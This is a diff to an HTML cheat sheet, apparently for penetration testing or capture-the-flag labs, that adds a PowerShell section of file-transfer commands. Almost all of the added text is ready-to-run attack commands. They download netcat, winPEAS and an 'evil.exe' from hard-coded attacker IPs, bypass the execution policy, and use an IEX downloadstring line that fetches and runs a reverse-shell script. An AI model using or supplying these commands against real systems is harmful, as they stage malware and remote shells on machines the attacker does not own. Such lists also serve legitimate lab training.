@@ -79,7 +79,40 @@ echo ts.Close >> wget.vbs
 
 #You then execute the script like this:
 
-  cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
+  cscript wget.vbs http://192.168.10.5/evil.exe evil.exe</pre>
+<hr>
+<h5>PowerShell</h5>
+<pre>
+#method 1
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.10.14.17/file.exe" >>wget.ps1
+echo $file = "output-file.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+--------------(or)---------------
+echo $storageDir = $pwd > wget.ps1 | echo $webclient = New-Object System.Net.WebClient >>wget.ps1 | echo $url = "http://10.10.14.77:8000/winPEAS.bat" >>wget.ps1 | echo $file = "winPEAS.bat" >>wget.ps1 | echo $webclient.DownloadFile($url,$file) >>wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+#method 2
+powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.17/nc.exe','c:\temp\nc.exe')
+--------------(or)---------------
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.17/nc.exe','c:\temp\nc.exe')
+
+#method 3
+powershell.exe -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
+
+#method 4
+powershell.exe wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe"
+
+#method 5
+powershell -c "IEX(new-objectnet.webclient).downloadstring('http://10.10.14.17:8000/Invoke-PowerShellTcp.ps1')"
+
+#method 6
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.77:8000/nc64.exe' -OutFile 'nc.exe'"
+
 </pre>
+<hr>
+
 </body>
 </html>
